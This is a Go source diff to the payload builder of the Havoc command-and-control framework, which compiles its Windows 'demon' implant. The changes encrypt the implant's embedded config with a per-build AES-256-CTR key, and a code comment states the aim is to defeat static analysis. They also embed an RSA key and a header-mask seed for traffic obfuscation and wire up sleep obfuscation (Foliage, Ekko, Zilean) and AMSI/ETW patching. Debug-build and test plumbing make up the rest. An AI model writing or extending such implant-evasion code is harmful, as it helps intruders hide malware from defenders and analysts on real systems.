@@ -2,6 +2,7 @@ package builder
 
 import (
 	"bytes"
+	"crypto/rand"
 	//"encoding/hex"
 	"encoding/json"
 	"errors"
@@ -13,7 +14,9 @@ import (
 	"strconv"
 	"strings"
 
+	"Havoc/pkg/agent"
 	"Havoc/pkg/common"
+	"Havoc/pkg/common/crypt"
 	"Havoc/pkg/common/packer"
 	"Havoc/pkg/handlers"
 	"Havoc/pkg/logger"
@@ -71,8 +74,12 @@ type BuilderConfig struct {
 	Compiler64 string
 	Compiler86 string
 	Nasm       string
-	DebugDev   bool
-	SendLogs   bool
+	// DebugDev: compile demon with `-DDEBUG -DDEBUG_NOSTDLIB`, console-subsystem
+	// EXE, no libc/libgcc. Debug output via the existing LogToConsole helper
+	// (dynamically resolved Win32.vsnprintf + WriteConsoleA). Binary gets a
+	// "debug" trailer appended so operators can identify it with `tail -c 16`.
+	DebugDev bool
+	SendLogs bool
 }
 
 type Builder struct {
@@ -135,6 +142,21 @@ type Builder struct {
 	outputPath string
 	preBytes   []byte
 
+	// [HVC-005 2026-03-28] BCRYPT_RSAPUBLIC_BLOB embedded as SERVER_PUBKEY_BLOB.
+	rsaPublicKeyBlob []byte
+
+	// testCmdRunner is non-nil only in tests.  When set, Cmd() delegates to it
+	// instead of exec.Command so tests can capture / fake the compile command
+	// without requiring a real cross-compiler.  The function receives the full
+	// shell command string and returns (success, stderr).
+	testCmdRunner func(cmd string) (bool, string)
+
+	// innerBuilderSetup is non-nil only in tests.  For FILETYPE_WINDOWS_RAW_BINARY
+	// the inner DLL builder is created inside Build(); this hook is called on that
+	// builder before its Build() runs, allowing tests to inject testCmdRunner and
+	// capture state (e.g. rsaPublicKeyBlob propagation).
+	innerBuilderSetup func(inner *Builder)
+
 	SendConsoleMessage func(MsgType, Message string)
 }
 
@@ -176,27 +198,20 @@ func NewBuilder(config BuilderConfig) *Builder {
 	 * --gc-sections                   Decides which input sections are used by examining symbols and relocations.
 	 */
 
-	logger.Debug(fmt.Sprintf("Payload Builder: Enable Debug Mode %v", config.DebugDev))
+	logger.Debug(fmt.Sprintf("Payload Builder: DebugDev=%v", config.DebugDev))
 
-	if config.DebugDev {
-		// debug mode includes symbols
-		builder.compilerOptions.CFlags = []string{
-			"",
-			"-Os -fno-asynchronous-unwind-tables -masm=intel",
-			"-fno-ident -fpack-struct=8 -falign-functions=1",
-			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
-			"-falign-labels=1 -fPIC",
-			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
-		}
-	} else {
-		builder.compilerOptions.CFlags = []string{
-			"",
-			"-Os -fno-asynchronous-unwind-tables -masm=intel",
-			"-fno-ident -fpack-struct=8 -falign-functions=1",
-			"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
-			"-falign-labels=1 -fPIC",
-			"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
-		}
+	// Production / debug-strings-only: identical CFlags. -nostdlib will be added
+	// below in either case (no libc, no libgcc). DebugDev differs only by
+	// adding -DDEBUG and -DDEBUG_NOSTDLIB (see below), so PRINTF/PUTS route
+	// through the LogToConsole helper which uses Instance->Win32.vsnprintf +
+	// WriteConsoleA — no libc dependency.
+	builder.compilerOptions.CFlags = []string{
+		"",
+		"-Os -fno-asynchronous-unwind-tables -masm=intel",
+		"-fno-ident -fpack-struct=8 -falign-functions=1",
+		"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
+		"-falign-labels=1 -fPIC",
+		"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
 	}
 
 	builder.compilerOptions.Main.Dll = "src/main/MainDll.c"
@@ -239,6 +254,16 @@ func (b *Builder) Build() bool {
 
 	if !b.silent {
 		b.SendConsoleMessage("Info", "starting build")
+		if b.compilerOptions.Config.DebugDev {
+			b.SendConsoleMessage("Info", "================================================================")
+			b.SendConsoleMessage("Info", "  DEBUG BUILD (--debug-dev)")
+			b.SendConsoleMessage("Info", "  - PE subsystem : CONSOLE (debug logs print to cmd.exe)")
+			b.SendConsoleMessage("Info", "  - linkage      : -nostdlib (no libc, no libgcc)")
+			b.SendConsoleMessage("Info", "  - debug output : LogToConsole (dynamic vsnprintf+WriteConsoleA)")
+			b.SendConsoleMessage("Info", "  - file trailer : binary appended with 'debug' marker")
+			b.SendConsoleMessage("Info", "  - DO NOT ship  : intended for analysis runs only")
+			b.SendConsoleMessage("Info", "================================================================")
+		}
 	}
 
 	Config, err := b.PatchConfig()
@@ -251,34 +276,112 @@ func (b *Builder) Build() bool {
 		b.SendConsoleMessage("Info", fmt.Sprintf("config size [%v bytes]", len(Config)))
 	}
 
-	//logger.Debug("len(Config) = ", len(Config))
-	array := "{"
-	for i := range Config {
-		if i == (len(Config) - 1) {
-			array += fmt.Sprintf("0x%02x", Config[i])
-		} else {
-			array += fmt.Sprintf("0x%02x\\,", Config[i])
-		}
+	// [HVC-014 2026-04-28] Encrypt the embedded config with AES-256-CTR.
+	// Goal: defeat trivial static analysis (xxd / strings) of the demon binary.
+	// Listener URLs, headers, user-agent, pivot pipe names etc. are all in
+	// `Config`; previously embedded as plaintext bytes via -DCONFIG_BYTES.
+	// Now: a fresh random 32-byte key + 16-byte IV are generated per build,
+	// the config is encrypted, and three defines are emitted:
+	//   CONFIG_BYTES = ciphertext (same length as plaintext — CTR is a stream cipher)
+	//   CONFIG_KEY   = 32 raw key bytes
+	//   CONFIG_IV    = 16 raw IV bytes
+	// The demon decrypts in-place at the top of DemonConfig() before parsing.
+	cfgKey := make([]byte, 32)
+	cfgIV := make([]byte, 16)
+	if _, randErr := rand.Read(cfgKey); randErr != nil {
+		logger.Error("HVC-014: failed to generate config AES key: " + randErr.Error())
+		return false
 	}
-	array += "}"
-	//logger.Debug("array = " + array)
+	if _, randErr := rand.Read(cfgIV); randErr != nil {
+		logger.Error("HVC-014: failed to generate config AES IV: " + randErr.Error())
+		return false
+	}
+	encryptedConfig := crypt.XCryptBytesAES256(Config, cfgKey, cfgIV)
+	if len(encryptedConfig) != len(Config) {
+		logger.Error(fmt.Sprintf("HVC-014: AES-CTR length mismatch: in=%d out=%d",
+			len(Config), len(encryptedConfig)))
+		return false
+	}
+	logger.Debug(fmt.Sprintf("HVC-014: config encrypted, %d plaintext bytes -> %d ciphertext bytes",
+		len(Config), len(encryptedConfig)))
 
-	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_BYTES="+array)
+	// Helper to format a byte slice as a C array initializer "{0xAA\,0xBB\,...}"
+	// (the backslash-comma escape is required by the shell command line).
+	formatByteArray := func(b []byte) string {
+		out := "{"
+		for i, v := range b {
+			if i == len(b)-1 {
+				out += fmt.Sprintf("0x%02x", v)
+			} else {
+				out += fmt.Sprintf("0x%02x\\,", v)
+			}
+		}
+		out += "}"
+		return out
+	}
+
+	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_BYTES="+formatByteArray(encryptedConfig))
+	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_KEY="+formatByteArray(cfgKey))
+	b.compilerOptions.Defines = append(b.compilerOptions.Defines, "CONFIG_IV="+formatByteArray(cfgIV))
+
+	// [HVC-005 2026-03-28] Embed the RSA-2048 public key blob as SERVER_PUBKEY_BLOB.
+	if len(b.rsaPublicKeyBlob) > 0 {
+		pubArray := "{"
+		for i, byt := range b.rsaPublicKeyBlob {
+			if i == len(b.rsaPublicKeyBlob)-1 {
+				pubArray += fmt.Sprintf("0x%02x", byt)
+			} else {
+				pubArray += fmt.Sprintf("0x%02x\\,", byt)
+			}
+		}
+		pubArray += "}"
+		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SERVER_PUBKEY_BLOB="+pubArray)
+	}
+
+	// [HVC-003 + profile-driven seed] Propagate the active HeaderMaskSeed to the
+	// Demon at compile time. This MUST match the teamserver's runtime
+	// agent.HeaderMaskSeed value so wire-format obfuscation round-trips.
+	// Defines.h has a `#ifndef HEADER_MASK_SEED` guard, so this -D overrides
+	// the header default. The U suffix forces an unsigned-int literal.
+	b.compilerOptions.Defines = append(b.compilerOptions.Defines,
+		fmt.Sprintf("HEADER_MASK_SEED=0x%08XU", agent.HeaderMaskSeed))
+	logger.Debug(fmt.Sprintf("Builder: HEADER_MASK_SEED define = 0x%08X", agent.HeaderMaskSeed))
 
 	// enable sending debug entries over HTTP(S) to the teamserver
 	if b.compilerOptions.Config.SendLogs {
 		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SEND_LOGS")
 	}
 
-	// enable debug mode
+	// Two modes are supported (the previous --debug-dev mode was removed in
+	// HVC-014; it linked libc and produced unstable demons — see
+	// Debug-Build-Instability-Analysis.md):
+	//   1. DebugDev=true → -DDEBUG, -DDEBUG_NOSTDLIB, no libc. Stable + logs.
+	//   2. neither               → no debug defines, no libc. Production.
+	//
+	// PE subsystem selection:
+	//   --debug-strings-only EXE  → -mconsole + -e WinMain.  Running the demon
+	//        from cmd.exe automatically connects stdout to the console window,
+	//        so PRINTF/PUTS output via LogToConsole appears in the terminal —
+	//        same operator UX as the now-removed --debug-dev mode but without
+	//        libc. -nostdlib drops mainCRTStartup; -mconsole's default entry
+	//        would be `main`, so we pin the entry point to WinMain explicitly.
+	//   Service EXE              → -mwindows always (services have no console).
+	//   Production / DLL / SHC   → -mwindows. The demon runs invisibly; PRINTF
+	//        is stripped to a no-op so there's nothing to print anyway.
 	if b.compilerOptions.Config.DebugDev {
 		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "DEBUG")
+		b.compilerOptions.Defines = append(b.compilerOptions.Defines, "DEBUG_NOSTDLIB")
+	}
+	if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
+		b.compilerOptions.CFlags[0] = "-mwindows -ladvapi32"
+	} else if b.compilerOptions.Config.DebugDev && b.FileType == FILETYPE_WINDOWS_EXE {
+		// EXE only: console subsystem so debug logs print to cmd.exe.
+		// `-e WinMain` is added later (line ~449 below) for all EXE builds —
+		// no need to repeat it here, doing so would create dual `-e` directives
+		// whose precedence is linker-version-dependent.
+		b.compilerOptions.CFlags[0] += " -nostdlib -mconsole"
 	} else {
-		if b.FileType == FILETYPE_WINDOWS_SERVICE_EXE {
-			b.compilerOptions.CFlags[0] = "-mwindows -ladvapi32"
-		} else {
-			b.compilerOptions.CFlags[0] += " -nostdlib -mwindows"
-		}
+		b.compilerOptions.CFlags[0] += " -nostdlib -mwindows"
 	}
 
 	// add compiler
@@ -402,8 +505,16 @@ func (b *Builder) Build() bool {
 		} else {
 			DllPayload.SetExtension(".x86.dll")
 		}
+		// [HVC-005] Propagate the RSA public key blob so SERVER_PUBKEY_BLOB is
+		// defined when Demon.c is compiled inside the inner DLL build.  Without
+		// this, the compiler fails on the unconditional `UCHAR PubKeyBlob[] =
+		// SERVER_PUBKEY_BLOB;` line in DemonMetaData(), and Build() returns false.
+		DllPayload.SetRSAPublicKey(b.rsaPublicKeyBlob)
 		DllPayload.compilerOptions.Defines = append(DllPayload.compilerOptions.Defines, "SHELLCODE")
 
+		if b.innerBuilderSetup != nil {
+			b.innerBuilderSetup(DllPayload)
+		}
 		b.SendConsoleMessage("Info", "compiling core dll...")
 		if DllPayload.Build() {
 
@@ -440,7 +551,13 @@ func (b *Builder) Build() bool {
 
 			return true
 		}
-		break
+		// Inner DLL compilation failed.  Return false immediately — do NOT fall
+		// through to the outer CompileCmd call below.  The outer command lacks
+		// format-specific flags (-shared / -e DllMain), so the linker would try
+		// to build a Windows executable, pull in libmingw32.a, and fail with
+		// "undefined reference to WinMain" — a confusing symptom that hides the
+		// real error (the DLL compile failure printed above).
+		return false
 
 	}
 
@@ -453,7 +570,99 @@ func (b *Builder) Build() bool {
 	//logger.Debug(CompileCommand)
 	Successful := b.CompileCmd(CompileCommand)
 
+	/* DEBUG strings audit — production safety contract.
+	 * When --debug-dev is NOT set, the produced binary must contain ZERO
+	 * "[DEBUG::" markers.  The Demon's PRINTF/PUTS/PRINT_HEX macros in
+	 * payloads/Demon/include/common/Macros.h strip to do/while(0) no-ops
+	 * when DEBUG is undefined, so a leak here means either:
+	 *   1. Someone added a direct printf/DbgPrint/DemonPrintf/LogToConsole
+	 *      call that bypassed the macros, or
+	 *   2. A macro was added without proper #ifdef DEBUG guarding.
+	 * Either way, fail the build immediately so the leak cannot ship. */
+	if Successful && !b.compilerOptions.Config.DebugDev {
+		if err := b.verifyNoDebugStringsInBinary(b.outputPath); err != nil {
+			logger.Error("DEBUG strings audit failed: " + err.Error())
+			if !b.silent {
+				b.SendConsoleMessage("Error", "DEBUG strings audit failed: "+err.Error())
+				b.SendConsoleMessage("Error", "rebuild with --debug-dev OR review recent changes to payloads/Demon/")
+			}
+			return false
+		}
+	}
+
+	/* DEBUG-BUILD-TRAILER: when --debug-dev is set, append the literal ASCII
+	 * string "debug" to the end of the produced binary file. This is a marker
+	 * for operators: a single `tail -c 5 demon.exe` (or `xxd | tail`) shows
+	 * whether they're holding a debug or production binary, eliminating
+	 * accidental ops-time use of a debug build. The trailer sits AFTER the
+	 * PE end and is ignored by the Windows loader — runtime behavior unchanged. */
+	if Successful && b.compilerOptions.Config.DebugDev {
+		if err := b.appendDebugTrailer(b.outputPath); err != nil {
+			logger.Error("Failed to append 'debug' trailer: " + err.Error())
+			if !b.silent {
+				b.SendConsoleMessage("Error", "Failed to append 'debug' trailer: "+err.Error())
+			}
+			return false
+		}
+		if !b.silent {
+			b.SendConsoleMessage("Info", "DEBUG build complete — 'debug' trailer appended to binary")
+		}
+	}
+
 	return Successful
+}
+
+/* appendDebugTrailer writes the literal ASCII bytes "debug" to the end of
+ * the file at `path`. Bytes after the PE end are not part of any section
+ * and are ignored by the Windows PE loader at runtime. */
+func (b *Builder) appendDebugTrailer(path string) error {
+	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0644)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	_, err = f.Write([]byte("debug"))
+	return err
+}
+
+/* verifyNoDebugStringsInBinary scans the produced Demon binary for the
+ * "[DEBUG::" marker that all PRINTF/PUTS macro expansions embed. The
+ * marker MUST be absent in production builds. Returns nil if clean,
+ * an error describing the leak otherwise. */
+func (b *Builder) verifyNoDebugStringsInBinary(path string) error {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		// If the file isn't there, the compile failed earlier — let the
+		// caller handle that. This audit is purely a leak check.
+		return nil
+	}
+
+	const marker = "[DEBUG::"
+	if idx := bytes.Index(data, []byte(marker)); idx >= 0 {
+		// Capture a small context window for the error message
+		end := idx + 64
+		if end > len(data) {
+			end = len(data)
+		}
+		ctx := string(data[idx:end])
+		// Replace non-printable bytes for the message
+		var safe []byte
+		for i := 0; i < len(ctx); i++ {
+			c := ctx[i]
+			if c >= 0x20 && c < 0x7f {
+				safe = append(safe, c)
+			} else {
+				safe = append(safe, '.')
+			}
+		}
+		return fmt.Errorf(
+			"binary at %s contains debug-output marker %q at offset %d (context: %q)",
+			path, marker, idx, string(safe),
+		)
+	}
+
+	logger.Debug(fmt.Sprintf("DEBUG strings audit OK: no %q markers in %s (%d bytes)", marker, path, len(data)))
+	return nil
 }
 
 func (b *Builder) SetListener(Type int, Config any) {
@@ -504,6 +713,12 @@ func (b *Builder) SetOutputPath(path string) {
 
 func (b *Builder) SetExtension(ext string) {
 	b.FileExtenstion = ext
+}
+
+// SetRSAPublicKey stores the BCRYPT_RSAPUBLIC_BLOB that will be embedded into
+// the payload as the SERVER_PUBKEY_BLOB compiler define. [HVC-005 2026-03-28]
+func (b *Builder) SetRSAPublicKey(blob []byte) {
+	b.rsaPublicKeyBlob = blob
 }
 
 func (b *Builder) GetOutputPath() string {
@@ -725,6 +940,14 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			}
 			break
 		}
+
+		// compile-time technique selection: only include the chosen obfuscation code
+		switch val {
+		case "Foliage":
+			b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SLEEPOBF_USE_FOLIAGE")
+		case "Ekko", "Zilean":
+			b.compilerOptions.Defines = append(b.compilerOptions.Defines, "SLEEPOBF_USE_TIMER")
+		}
 	} else {
 		return nil, errors.New("sleep Obfuscation technique is undefined")
 	}
@@ -734,7 +957,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		if ConfigObfTechnique != SLEEPOBF_NO_OBF {
 			switch val {
 			case "jmp rax":
-				ConfigObfTechnique = SLEEPOBF_BYPASS_JMPRAX
+				ConfigObfBypass = SLEEPOBF_BYPASS_JMPRAX
 				if !b.silent {
 					b.SendConsoleMessage("Info", "sleep jump gadget \"jmp rax\" has been specified")
 				}
@@ -782,7 +1005,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			}
 		}
 	} else {
-		return nil, errors.New("sleep Obfuscation technique is undefined")
+		return nil, errors.New("Stack Duplication is undefined")
 	}
 
 	if val, ok := b.config.Config["Proxy Loading"].(string); ok && len(val) > 0 {
@@ -823,13 +1046,13 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			break
 		}
 	} else {
-		return nil, errors.New("sleep Obfuscation technique is undefined")
+		return nil, errors.New("Proxy Loading is undefined")
 	}
 
 	if val, ok := b.config.Config["Amsi/Etw Patch"].(string); ok && len(val) > 0 {
 		switch val {
 
-		case "Hardware breakpoints":
+		case "Hardware breakpoints", "HWBP":
 			ConfigAmsiPatch = AMSIETW_PATCH_HWBP
 			if !b.silent {
 				b.SendConsoleMessage("Info", "amsi/etw patching technique: hardware breakpoints")
@@ -844,7 +1067,7 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 			break
 		}
 	} else {
-		return nil, errors.New("sleep Obfuscation technique is undefined")
+		return nil, errors.New("Amsi/Etw Patch is undefined")
 	}
 
 	// behaviour configuration (alloc/exec/spawn)
@@ -1062,6 +1285,19 @@ func (b *Builder) GetPayloadBytes() []byte {
 }
 
 func (b *Builder) Cmd(cmd string) bool {
+	// In tests a fake runner is injected so we don't need the real cross-compiler.
+	if b.testCmdRunner != nil {
+		ok, errOut := b.testCmdRunner(cmd)
+		if !ok {
+			logger.Error("Couldn't compile implant (test runner): " + errOut)
+			if !b.silent {
+				b.SendConsoleMessage("Error", "couldn't compile implant: "+errOut)
+				b.SendConsoleMessage("Error", "compile output: "+errOut)
+			}
+		}
+		return ok
+	}
+
 	var (
 		Command = exec.Command("sh", "-c", cmd)
 		stdout  bytes.Buffer
